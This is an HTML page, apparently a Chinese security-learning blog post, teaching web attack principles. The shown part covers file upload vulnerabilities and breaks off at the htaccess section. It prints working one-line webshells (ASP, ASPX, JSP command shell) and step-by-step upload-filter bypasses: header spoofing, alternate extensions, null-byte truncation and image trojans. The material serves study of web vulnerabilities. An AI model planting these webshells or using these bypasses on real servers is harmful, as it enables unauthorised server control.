@@ -1,0 +1,1007 @@
+<!doctype html><html lang=zh-cn data-theme=dark><head><meta charset=utf-8><meta name=viewport content="width=device-width"><meta name=theme-color content="#222" media="(prefers-color-scheme: dark)"><meta name=generator content="Hugo 0.112.3"><link rel="shortcut icon" type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/png sizes=16x16 href=/imgs/icons/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=/imgs/icons/favicon-32x32.png><link rel=apple-touch-icon sizes=180x180 href=/imgs/icons/apple-touch-icon.png><meta itemprop=name content="Web 攻防原理剖析"><meta itemprop=description content="Web 攻防原理剖析。"><meta itemprop=datePublished zgotmplz><meta itemprop=dateModified zgotmplz><meta itemprop=image content="https://0linkun.github.io/imgs/avatar.jpg"><meta itemprop=keywords content="window,Web,网络安全"><meta property="og:type" content="article"><meta property="og:title" content="Web 攻防原理剖析"><meta property="og:description" content="Web 攻防原理剖析。"><meta property="og:image" content="/imgs/avatar.jpg"><meta property="og:image:width" content="312"><meta property="og:image:height" content="312"><meta property="og:image:type" content="image/jpeg/png/svg/jpg"><meta property="og:url" content="https://0linkun.github.io/post/Studyweb.html"><meta property="og:site_name" content="Hellciw's Blog"><meta property="og:locale" content="zh-CN"><meta property="article:author" content="Hellciw"><meta property="article:published_time" content="2023-07-27 00:00:13 +0800 CST"><meta property="article:modified_time" content="2023-07-27 00:19:13 +0800 CST"><link type=text/css rel=stylesheet href=https://cdn.staticfile.org/font-awesome/6.1.2/css/all.min.css><link type=text/css rel=stylesheet href=https://cdn.staticfile.org/animate.css/3.1.1/animate.min.css><link type=text/css rel=stylesheet href=https://cdn.staticfile.org/viewerjs/1.11.0/viewer.min.css><link rel=stylesheet href=/css/main.min.e97f89da47cfd6930d1bd351cfec5e6ba64d1561b506e784816bf3efdf76a2d4.css><style type=text/css>.post-footer,.flinks-list-footer hr:after{content:"~ 我可是有底线的哟 ~"}</style><script type=text/javascript>(function(){localDB={set:function(e,t,n){if(n===0)return;const s=new Date,o=n*864e5,i={value:t,expiry:s.getTime()+o};localStorage.setItem(e,JSON.stringify(i))},get:function(e){const t=localStorage.getItem(e);if(!t)return void 0;const n=JSON.parse(t),s=new Date;return s.getTime()>n.expiry?(localStorage.removeItem(e),void 0):n.value}},theme={active:function(){const e=localDB.get("theme");if(e==null)return;theme.toggle(e),window.matchMedia("(prefers-color-scheme: dark)").addListener(function(e){theme.toggle(e.matches?"dark":"light")})},toggle:function(e){document.documentElement.setAttribute("data-theme",e),localDB.set("theme",e,2);const t=document.querySelector("iframe.giscus-frame");if(t){const n={setConfig:{theme:e}};t.contentWindow.postMessage({giscus:n},"https://giscus.app")}}},theme.active()})(window)</script><script class=next-config data-name=page type=application/json>{"comments":"ture","isHome":false,"isPage":true,"path":"Studyweb.html","permalink":"https://0linkun.github.io/post/Studyweb.html","title":"Web 攻防原理剖析","waline":{"js":[{"alias":"waline","alias_name":"@waline/client","file":"dist/pageview.js","name":"pageview","version":"2.13.0"},{"alias":"waline","alias_name":"@waline/client","file":"dist/comment.js","name":"comment","version":"2.13.0"}]}}</script><script type=text/javascript>document.addEventListener("DOMContentLoaded",()=>{var e=document.createElement("script");e.charset="UTF-8",e.src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js",e.async=!1,e.defer=!0,document.head.appendChild(e),e.onload=function(){NexT.utils.fmtBusuanzi()}})</script><title>Web 攻防原理剖析 - Hellciw's Blog</title><noscript><link rel=stylesheet href=/css/noscript.css></noscript></head><body itemscope itemtype=http://schema.org/WebPage class=use-motion><div class=headband></div><main class=main><header class=header itemscope itemtype=http://schema.org/WPHeader><div class=header-inner><div class=site-brand-container><div class=site-nav-toggle><div class=toggle aria-label role=button><span class=toggle-line></span>
+<span class=toggle-line></span>
+<span class=toggle-line></span></div></div><div class=site-meta><a href=/ class=brand rel=start><i class=logo-line></i><h1 class=site-title>Hellciw's Blog</h1><i class=logo-line></i></a><p class=site-subtitle itemprop=description>I'm Hellciw, Nice To Meet You(ˊ˘ˋ*)♡</p></div><div class=site-nav-right><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class=site-nav><ul class="main-menu menu"><li class="menu-item menu-item-home"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-home hvr-icon"></i>首页</a></li><li class="menu-item menu-item-about"><a href=/about.html class=hvr-icon-pulse rel=section><i class="fa fa-user hvr-icon"></i>关于</a></li><li class="menu-item menu-item-flinks"><a href=/flinks.html class=hvr-icon-pulse rel=section><i class="fa fa-thumbs-up hvr-icon"></i>友情链接</a></li><li class="menu-item menu-item-archives"><a href=/archives/ class=hvr-icon-pulse rel=section><i class="fa fa-archive hvr-icon"></i>归档
+<span class=badge>13</span></a></li><li class="menu-item menu-item-commonweal"><a href=/404.html class=hvr-icon-pulse rel=section><i class="fa fa-heartbeat hvr-icon"></i>公益 404</a></li><li class="menu-item menu-item-search"><a role=button class="popup-trigger hvr-icon-pulse"><i class="fa fa-search fa-fw hvr-icon"></i>搜索</a></li></ul></nav><div class=search-pop-overlay><div class="popup search-popup"><div class=search-header><span class=search-icon><i class="fa fa-search"></i></span><div class=search-input-container><input autocomplete=off autocapitalize=off maxlength=80 placeholder=搜索... spellcheck=false type=search class=search-input></div><span class=popup-btn-close role=button><i class="fa fa-times-circle"></i></span></div><div class="search-result-container no-result"><div class=search-result-icon><i class="fa fa-spinner fa-pulse fa-5x"></i></div></div></div></div></div><div class="toggle sidebar-toggle" role=button><span class=toggle-line></span>
+<span class=toggle-line></span>
+<span class=toggle-line></span></div><aside class=sidebar><div class="sidebar-inner sidebar-nav-active sidebar-toc-active"><ul class=sidebar-nav><li class=sidebar-nav-toc>文章目录</li><li class=sidebar-nav-overview>站点概览</li></ul><div class=sidebar-panel-container><div class="post-toc-wrap sidebar-panel"><div class="post-toc animated"><nav id=TableOfContents><ul><li><a href=#1-文件上传漏洞>1 文件上传漏洞</a><ul><li><a href=#11-漏洞简介>1.1 漏洞简介</a></li><li><a href=#12-漏洞利用>1.2 漏洞利用</a><ul><li><a href=#121-asp>1.2.1 ASP</a></li><li><a href=#122-aspx>1.2.2 ASPX</a></li><li><a href=#123-php>1.2.3 PHP</a></li><li><a href=#124-jsp-cmdshell>1.2.4 JSP Cmdshell</a></li></ul></li><li><a href=#13-漏洞实战>1.3 漏洞实战</a><ul><li><a href=#131-js-前端绕过>1.3.1 JS 前端绕过</a></li><li><a href=#132-文件头绕过>1.3.2 文件头绕过</a></li><li><a href=#133-黑名单缺陷>1.3.3 黑名单缺陷</a></li><li><a href=#134-古老的-00-截断>1.3.4 古老的 00 截断</a></li><li><a href=#135-htaccess-绕过>1.3.5 htaccess 绕过</a></li></ul></li></ul></li><li><a href=#2-文件下载漏洞>2 文件下载漏洞</a><ul><li><a href=#21-漏洞简介>2.1 漏洞简介</a></li><li><a href=#22-漏洞利用>2.2 漏洞利用</a><ul><li><a href=#221-漏洞特征发现>2.2.1 漏洞特征发现</a></li><li><a href=#222-漏洞简单验证>2.2.2 漏洞简单验证</a></li><li><a href=#223-常见的敏感文件>2.2.3 常见的敏感文件</a></li></ul></li><li><a href=#23-漏洞实战>2.3 漏洞实战</a><ul><li><a href=#231-下载站点配置文件>2.3.1 下载站点配置文件</a></li><li><a href=#232-下载-shadow-文件>2.3.2 下载 shadow 文件</a></li></ul></li></ul></li><li><a href=#3-文件包含漏洞>3 文件包含漏洞</a><ul><li><a href=#31-漏洞简介>3.1 漏洞简介</a><ul><li><a href=#311-本地文件包含>3.1.1 本地文件包含</a></li></ul></li><li><a href=#32-远程文件包含>3.2 远程文件包含</a><ul><li><a href=#漏洞利用>漏洞利用</a></li><li><a href=#321-本地文件包含截断>3.2.1 本地文件包含截断</a></li><li><a href=#322-远程文件包含截断>3.2.2 远程文件包含截断</a></li><li><a href=#323-php-伪协议>3.2.3 PHP 伪协议</a></li></ul></li><li><a href=#33-漏洞实战>3.3 漏洞实战</a><ul><li><a href=#331-包含图片木马-getshell>3.3.1 包含图片木马 getshell</a></li><li><a href=#332-包含日志-getshell>3.3.2 包含日志 getshell</a></li></ul></li></ul></li><li><a href=#4-sql-注入漏洞>4 SQL 注入漏洞</a><ul><li><a href=#41-漏洞简介>4.1 漏洞简介</a></li><li><a href=#42-漏洞利用>4.2 漏洞利用</a><ul><li><a href=#421-sql-注入靶场>4.2.1 SQL 注入靶场</a></li><li><a href=#422-sql-注入工具>4.2.2 SQL 注入工具</a></li><li><a href=#423-sql-注入分类>4.2.3 SQL 注入分类</a></li></ul></li></ul></li></ul></nav></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author site-overview-item animated" itemprop=author itemscope itemtype=http://schema.org/Person><img class=site-author-image itemprop=image alt=Hellciw src=/imgs/img-lazy-loading.gif data-src=/imgs/avatar.jpg><p class=site-author-name itemprop=name>Hellciw</p><div class=site-description itemprop=description>深呼吸的时候，就能保持沉稳</div></div><div class="site-state-wrap site-overview-item animated"><nav class=site-state><div class="site-state-item site-state-posts"><a href=/archives/><span class=site-state-item-count>13</span>
+<span class=site-state-item-name>日志</span></a></div><div class="site-state-item site-state-categories"><a href=/categories/><span class=site-state-item-count>13</span>
+<span class=site-state-item-name>分类</span></a></div><div class="site-state-item site-state-tags"><a href=/tags/><span class=site-state-item-count>9</span>
+<span class=site-state-item-name>标签</span></a></div></nav></div><div class="links-of-social site-overview-item animated"><span class=links-of-social-item><a href=https://github.com/0linkun title="Github → https://github.com/0linkun" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-github fa-fw hvr-icon"></i>
+Github</a></span></div><div class="cc-license animated" itemprop=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh class=cc-opacity rel=noopener target=_blank title=共享知识><img src=/imgs/img-lazy-loading.gif data-src=/imgs/cc/big/by_nc_sa.svg alt=共享知识></a></div><div class="links-of-blogroll site-overview-item animated"><div class=links-of-blogroll-title><i class="fa fa-globe fa-fw"></i>
+友情链接</div><ul class=links-of-blogroll-list><li class=links-of-blogroll-item><a href=https://hihopkc.github.io/ title=https://hihopkc.github.io/ target=_blank>嘻哈磕碜</a></li><li class=links-of-blogroll-item><a href=https://endermanneer.github.io/ title=https://endermanneer.github.io/ target=_blank>Enderman_1's blog</a></li><li class=links-of-blogroll-item><a href=http://www.icewindy.cn/ title=http://www.icewindy.cn/ target=_blank>IceWindy's Blog</a></li></ul></div></div></div></div><div id=siteinfo-card-widget class=sidebar-card-widget><div class=item-headline><i class="fas fa-chart-line"></i>
+<span>网站资讯</span></div><div class=siteinfo><div class=siteinfo-item><div class=item-name><i class="fa-solid fa-calendar-check"></i>已运行：</div><div class=item-count id=runTimes data-publishdate=2023-05-01T22:19:13+08:00></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-user"></i>总访客数：</div><div class=item-count id=busuanzi_value_site_uv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-eye"></i>页面浏览：</div><div class=item-count id=busuanzi_value_site_pv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-font"></i>总字数：</div><div class=item-count id=wordsCount data-count=40734></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-mug-hot"></i>阅读约：</div><div class=item-count id=readTimes data-times=89></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-clock-rotate-left"></i>最后更新于：</div><div class=item-count id=last-push-date data-lastpushdate=2023-07-27T00:00:13+08:00></div></div></div></div></aside><div class=sidebar-dimmer></div></header><div class=tool-buttons><div id=goto-comments class="button goto-comments" title=直达评论><i class="fas fa-comments"></i></div><div id=toggle-theme class=button title=深浅模式切换><i class="fas fa-adjust"></i></div><div class=back-to-top role=button title=返回顶部><i class="fa fa-arrow-up"></i>
+<span>0%</span></div></div><div class=reading-progress-bar></div><a role=button class="book-mark-link book-mark-link-fixed"></a>
+<a href=https://github.com/0linkun rel="noopener external nofollow noreferrer" target=_blank title="Follow me on GitHub" class="exturl github-corner"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentcolor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentcolor" class="octo-body"/></svg></a><noscript><div class=noscript-warning>Theme NexT works best with JavaScript enabled</div></noscript><div class="main-inner post posts-expand"><div class=post-block><article itemscope itemtype=http://schema.org/Article class=post-content lang><link itemprop=mainEntityOfPage href=https://0linkun.github.io/post/Studyweb.html><span hidden itemprop=author itemscope itemtype=http://schema.org/Person><meta itemprop=image content="/imgs/avatar.jpg"><meta itemprop=name content="Hellciw"></span><span hidden itemprop=publisher itemscope itemtype=http://schema.org/Organization><meta itemprop=name content="Hellciw"><meta itemprop=description content="深呼吸的时候，就能保持沉稳"></span><span hidden itemprop=post itemscope itemtype=http://schema.org/CreativeWork><meta itemprop=name content="Web 攻防原理剖析"><meta itemprop=description content="Web 攻防原理剖析。"></span><header class=post-header><h1 class=post-title itemprop="name headline">Web 攻防原理剖析</h1><div class=post-meta-container><div class=post-meta-items><span class=post-meta-item><span class=post-meta-item-icon><i class="far fa-calendar"></i></span>
+<span class=post-meta-item-text title=发表于>发表于：</span>
+<time title="创建时间：2023-07-27 00:00:13 +0800 CST" itemprop="dateCreated datePublished" datetime="2023-07-27 00:00:13 +0800 CST">2023-07-27</time></span>
+<span class=post-meta-item><span class=post-meta-item-icon><i class="far fa-calendar-check"></i></span>
+<span class=post-meta-item-text title=更新于>更新于：</span>
+<time title=修改时间：2023-07-27T00:19:13+08:00 itemprop=dateModified datetime=2023-07-27T00:19:13+08:00>2023-07-27</time></span>
+<span class=post-meta-item><span class=post-meta-item-icon><i class="far fa-folder-open"></i></span>
+<span class=post-meta-item-text title=分类于>分类于：</span>
+<span itemprop=about itemscope itemtype=http://schema.org/Thing><a href=/categories/web itemprop=url rel=index><span itemprop=name>网安学习/Web</span></a></span></span></div><div class=post-meta-items><span class=post-meta-item title=字数><span class=post-meta-item-icon><i class="far fa-file-word"></i></span>
+<span class=post-meta-item-text>字数：</span>
+<span>25306</span></span>
+<span class=post-meta-item title=阅读><span class=post-meta-item-icon><i class="far fa-clock"></i></span>
+<span class=post-meta-item-text>阅读：&ap;</span>
+<span>51分钟</span></span>
+<span class=post-meta-item title=浏览><span class=post-meta-item-icon><i class="far fa-eye"></i></span>
+<span class=post-meta-item-text>浏览：</span>
+<span id=busuanzi_value_page_pv data-path=/post/Studyweb.html><i class="fa fa-sync fa-spin"></i></span></span></div></div></header><div class=post-body itemprop=articleBody><p>学习目标</p><ol><li><p>掌握 SQL、XXE 注入漏洞的原理与实践</p></li><li><p>掌握文件包含漏洞的原理与防御方法</p></li><li><p>理解命令执行漏洞与防御</p></li><li><p>掌握 XSS 漏洞原理与防御</p></li><li><p>掌握 CSRF 与 SSRF 请求伪造漏洞原理与防御</p></li><li><p>掌握任意文件上传与任意文件读取漏洞</p></li><li><p>掌握逻辑漏洞中的越权漏洞</p></li><li><p>掌握反序列化漏洞攻击与防御 Web 安全中有很多需要了解或掌握的安全漏洞，这些漏洞在实战中也经常会出现，如 SQL 注入漏洞、XXE XML 实体注入、文件包含漏洞、命令执行漏洞，以及 XSS、CSRF、SSRF、文件上传、文件下载、反序列化、业务逻辑等漏洞的相关安全知识，下面要开始踏入 Web 攻防原理剖析的学习日程了。</p></li></ol><h2 id=1-文件上传漏洞>1 文件上传漏洞
+<a class=header-anchor href=#1-%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%e6%bc%8f%e6%b4%9e></a></h2><h3 id=11-漏洞简介>1.1 漏洞简介
+<a class=header-anchor href=#11-%e6%bc%8f%e6%b4%9e%e7%ae%80%e4%bb%8b></a></h3><p>现代互联网的 Web 应用程序中，上传文件是一种常见的功能，因为它有助于提高业务效率，如企业的 OA 系统，允许用户上传图片、视频、头像和许多其他类型的文件。然而向用户提供的功能越多，Web 应用受到攻击的风险就越大，如果 Web 应用存在文件上传漏洞，那么恶意用户就可以利用文件上传漏洞将可执行脚本程序（WebShell）上传到服务器中，获得网站的权限，然后可以进一步对服务器进行入侵，扩大控制权限。</p><h3 id=12-漏洞利用>1.2 漏洞利用
+<a class=header-anchor href=#12-%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8></a></h3><p>非法用户可以利用上传的恶意脚本文件控制整个网站，甚至服务器。这个恶意的脚本文件，又被称为 WebShell，是以 ASP、PHP、JSP 等网页设计语言编写的网页脚本，通常也叫作网页后门。攻击者在入侵了一个网站后，常会将 WebShell 上传到网站的目录下或者插入正常的网页中，然后使用浏览器或者对应的 WebShell 客户端来访问这些后门，将会得到一个命令执行的环境，以达到控制网站服务器的目的。 各个脚本语言经典的 WebShell 如下</p><h4 id=121-asp>1.2.1 ASP
+<a class=header-anchor href=#121-asp></a></h4><p>密码为 x 的 asp 一句话木马：</p><pre><%eval request("x")%>
+<%execute request("x")%></pre><h4 id=122-aspx>1.2.2 ASPX
+<a class=header-anchor href=#122-aspx></a></h4><p>密码为 x 的 aspx 一句话木马：</p><pre><%@ Page Language="Jscript"%>
+<%eval(Request.Item["x"],"unsafe");%></pre><h4 id=123-php>1.2.3 PHP
+<a class=header-anchor href=#123-php></a></h4><p>密码为 x 的 php 一句话木马：</p><pre>
+</pre><h4 id=124-jsp-cmdshell>1.2.4 JSP Cmdshell
+<a class=header-anchor href=#124-jsp-cmdshell></a></h4><p>密码为 x 的 jsp cmdshell 木马，通过 i 传递要执行的命令，使用的时候只需要传递？pwd=x&amp;i=id 即可执行 id 命令：</p><pre><%
+  if("x".equals(request.getParameter("pwd")))     
+
+  { 
+      java.io.InputStream in=Runtime.getRuntime().exec(r
+equest.getParameter("i")).getInputStream();     
+
+     int a = -1;    
+    
+      byte[] b = new byte[2048];     
+    
+     out.print("<pre>");     
+    
+      while((a=in.read(b))!=-1)     
+    
+     {     
+    
+         out.println(new String(b));      
+    
+      }      
+    
+      out.print("</pre>");<pre><code>  }    %&gt;&lt;/pre&gt;
+</code></pre><h3 id=13-漏洞实战>1.3 漏洞实战
+<a class=header-anchor href=#13-%e6%bc%8f%e6%b4%9e%e5%ae%9e%e6%88%98></a></h3><h4 id=131-js-前端绕过>1.3.1 JS 前端绕过
+<a class=header-anchor href=#131-js-%e5%89%8d%e7%ab%af%e7%bb%95%e8%bf%87></a></h4><p>Web 应用系统对用户上传的文件进行了校验，该校验是通过前端 JavaScript 代码完成的。恶意用户对前端 JavaScript 进行修改或者是通过抓包软件篡改上传的文件，就能轻松绕过基于 JS 的前端校验。 如何判断是不是前端校验呢？首先抓包监听，如果上传文件的时候还没有抓取到数据包，可浏览器就已经提示文件类型不正确，那么这个多半就是前端校验。JS 前端校验样例如下图所示。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688558370_64a55b22c8f69efd0f5dc.jpg!small?1688558370885 alt></p><p>                                                                                                 JS 前端校验样例</p><p>可以看到，点击上传之后，Burp Suite 抓包并未抓取到任何数据，但是浏览器弹出了警告框，由此可以判定这是一个 JS 前端校验。 绕过这种校验的方式也很简单，由于该校验本身只是纯粹地对后缀名进行判断，我们先将写有一句话木马的 php 文件修改为 jpg 后缀格式的文件，打开 Burp Suite 抓包后选择写有一句话木马的 jpg 后缀文件进行上传。Burp Suite 抓包如下图所示。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688558406_64a55b46a5e595890bcb0.jpg!small?1688558406768 alt></p><p>                                                                                                      Burp Suite 抓包</p><p>将抓取到的 shell.jpg 的后缀 jpg 改为 php，然后点击提交。 后缀修改如下图所示。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688558429_64a55b5d9c01f5b669224.jpg!small?1688558429561 alt></p><p>                                                                                   后缀修改</p><p>可以看到，成功上传后，页面并没有回显上传后的路径，只是显示了上传后的图片，可以按 “F12” 键打开浏览器控制台定位到目标的 html 代码，查看上传之后的路径./upload/shell.php。 WebShell 路径如下图所示。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688558461_64a55b7ddc35d35299e5f.jpg!small?1688558462083 alt></p><p>                                                                                                WebShell 路径</p><p>访问目标，传入参数 1=phpinfo()，输出 phpinfo 如下图所示。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688562436_64a56b04cc306870cf06f.jpg!small?1688562436935 alt></p><p>                                                                                          输出 phpinfo</p><p>成功访问，使用蚁剑、中国菜刀等 shell 连接工具连接。如下图所示为蚁剑连接</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688562461_64a56b1d387d788252ba1.jpg!small?1688562461659 alt></p><p>                                                                                                   蚁剑连接</p><h4 id=132-文件头绕过>1.3.2 文件头绕过
+<a class=header-anchor href=#132-%e6%96%87%e4%bb%b6%e5%a4%b4%e7%bb%95%e8%bf%87></a></h4><p>文件上传时，服务器除了 JS 前端检验，有的检验还会对上传的文件进行文件头检测。文件头信息通常在一个文件的开头，我们用查看十六进制的方式可以查看一个文件的文件头信息。这也是最方便、最快捷的用来辨别一个文件真实内容的方法。如下图为 gif 文件头内容。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688562488_64a56b3892b1f5c9ae90d.jpg!small?1688562488911 alt></p><p>                                                                                                             gif 文件头</p><p>常见的文件头标志如下：</p><p>・ JPEG （jpg），文件头：FFD8FF；</p><p>・ PNG （png），文件头：89504E47；</p><p>・ GIF （gif），文件头：47494638；</p><p>・ HTML （html），文件头：68746D6C3E；</p><p>・ ZIP Archive （zip），文件头：504B0304；</p><p>・ RAR Archive （rar），文件头：52617221；</p><p>・ Adobe Acrobat （pdf），文件头：255044462D312E；</p><p>・ MS Word/Excel （xls.or.doc），文件头：D0CF11E0。</p><p>校验图片的文件头也就是校验图片内容，这个时候使用一个标准的图片木马是可以成功绕过的，这类代码大部分只校验了前面几个字节，所以直接写 GIF89a 即可成功绕过。直接上传 php 文件，开启 Burp Suite 抓包截断传输，添加并修改数据。 添加文件头如下图所示。</p><p>添加文件头如下图所示。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688562557_64a56b7ddf3db772ec1d4.jpg!small?1688562557969 alt></p><p>添加文件头</p><p>首先将 Content-Type 的参数修改为 image/jpeg，该参数代表上传的文件为图片文件，然后添加 GIF 动图的文件头 GIF89a，点击上传。 按 “F12” 键，再定位可以获取上传的文件路径。 获取的文件路径如下图所示。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688562570_64a56b8ad97484442e1b0.jpg!small?1688562571082 alt></p><p>                                                                                          获取的文件路径</p><p>使用浏览器访问，可以看到多了一个 GIF89a，这是通过 Burp Suite 添加的文件头。浏览器访问结果（一）如下图所示。</p><p>    <img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688562605_64a56bad236c452d9d931.jpg!small?1688562605461 alt>                                                         浏览器访问结果（一）</p><p>下图为使用蚁剑连接。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688562622_64a56bbe4a12e66bfeb14.jpg!small?1688562622527 alt></p><p>                                                                                   使用蚁剑连接</p><p>另一种方式就是使用前文提到的图片木马，那如何制作图片木马呢？ 准备写有一句话木马的 shell.php 文件和一张普通的 demo.jpg 图片文件，将二者放在同一个目录下，通过 cmd 使用 copy 命令制作图片木马：</p><pre>D:\phpStudy\PHPTutorial\WWW>copy demo.jpg/b + shell.php 
+ shell.jpg   demo.jpg   shell.php   
+ 已复制        1 个文件。</pre><p>执行成功后，查看目标文件，可以看到 “一句话木马” 已经添加到图片后面了。图片木马如下图所示。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688562644_64a56bd4d19243143e3e2.jpg!small?1688562645196 alt></p><p>                                                                                            图片木马</p><p>图片木马的利用和之前其他木马程序的利用方式不太相同，由于最终上传的文件格式为 jpg 的图片格式，嵌套在其中的代码并不会被当成 php 代码执行，所以在获取上传路径之后，需要结合后文所说的文件包含漏洞进行利用。</p><h4 id=133-黑名单缺陷>1.3.3 黑名单缺陷
+<a class=header-anchor href=#133-%e9%bb%91%e5%90%8d%e5%8d%95%e7%bc%ba%e9%99%b7></a></h4><p>限制文件上传的方式千奇百怪，白名单与黑名单就是常见的限制方式。白名单是设置可以让用户上传的文件格式，白名单以外的文件格式都不能通过。黑名单是设置用户不能上传的文件格式，黑名单以外的文件格式都能通过。所以在一般情况下，白名单比黑名单限制的用户要更多一些。 如何判断是白名单限制还是黑名单限制呢？可以看一下上传的特征。如下图便为黑名单限制的例子。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688562669_64a56bedb26080373d9d6.jpg!small?1688562669989 alt></p><p>                                                                                     黑名单限制的例子</p><p>在选择文件上传后，显示的是不允许上传的文件格式，并且列出了一些不允许上传的文件后缀，根据 php 解析的特征，默认情况下 Apache 把 phtml、pht、php、php3、php4、php5 解析为 PHP，所以在这里为上传特殊后缀的 php 文件格式。特殊后缀文件如下图所示。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688562688_64a56c003d4bb85a62f4c.jpg!small?1688562688333 alt></p><p>                                                                                             特殊后缀文件</p><p>获取上传之后的文件路径，通过浏览器访问。浏览器访问结果（二）如下图所示。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688562709_64a56c153c40876b8081c.jpg!small?1688562709473 alt></p><p>                                                                                      浏览器访问结果（二）</p><p>使用蚁剑工具连接，显示成功连接，如下图所示</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688562731_64a56c2b08ef43f01f551.jpg!small?1688562731157 alt></p><p>                                                                                              成功连接</p><h4 id=134-古老的-00-截断>1.3.4 古老的 00 截断
+<a class=header-anchor href=#134-%e5%8f%a4%e8%80%81%e7%9a%84-00-%e6%88%aa%e6%96%ad></a></h4><p>在实战环境中，为了防止用户上传恶意文件，服务端会通过一些函数来获取用户上传的文件后缀再进行黑名单与白名单的对比，从而判断用户上传的文件是否符合要求。函数组合方式示例如下：</p><pre>$deny_ext=array(’.asp’,’.aspx’,’.php’,’.jsp’);
+$ﬁle_name=trim($_FILES[’upload_ﬁle’][’name’]);
+$ﬁle_name=deldot($ﬁle_name);//删除文件名末尾的点    $ﬁle_ext=strrchr($ﬁle_name, ’.’);    
+$ﬁle_ext=strtolower($ﬁle_ext); //转换为小写    $ﬁle_ext=str_ireplace(’::$DATA’, ’’, $ﬁle_ext)
+;//去除字符串::$DATA    
+$ﬁle_ext = trim($ﬁle_ext); //首尾去空</pre><p>获取上传文件后缀是从右向左，碰到指定字符时停止。在某些特殊环境下，一些特殊的字符也会使服务器在获取文件后缀时提前终止，%00 便是一个特殊字符。其意义是连接字符串时，0 字节（\x00）将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个 0 字节，就能截断 file 变量之后的字符串。 选择一句话木马文件，并将其后缀改为 jpg 或其他图片类型，开启 Burp Suite 抓包，点击上传，如下图所示，为文件上传路径。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688562754_64a56c427e01fdeecc483.jpg!small?1688562754769 alt></p><p>                                                                                     文件上传路径</p><p>可以发现在 POST 传送的参数中，显示了保存的路径，我们可以手动写入保存的文件名，并加上 0 字节截断特征，加上字符后对其进行一次 url 解码。使用 00 截断如下图所示</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688562784_64a56c607ece5f45cacec.jpg!small?1688562784582 alt></p><p>                                                                                                   使用 00 截断</p><p>提交上传，直接访问我们更改之后的路径地址 url/upload/shell.php，传入参数。浏览器访问结果（三）如下图所示。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688562806_64a56c76868ea5e241321.jpg!small?1688562806606 alt></p><p>                                                                浏览器访问结果（三）</p><p>接下来可以通过工具连接 shell，进行访问和利用。下图为蚁剑连接效果。</p><p><img src=/imgs/img-lazy-loading.gif data-src=https://image.3001.net/images/20230705/1688562823_64a56c876353d6200b873.jpg!small?1688562823545 alt></p><p>                                                                                       蚁剑连接效果</p><h4 id=135-htaccess-绕过>1.3.5 htaccess 绕过
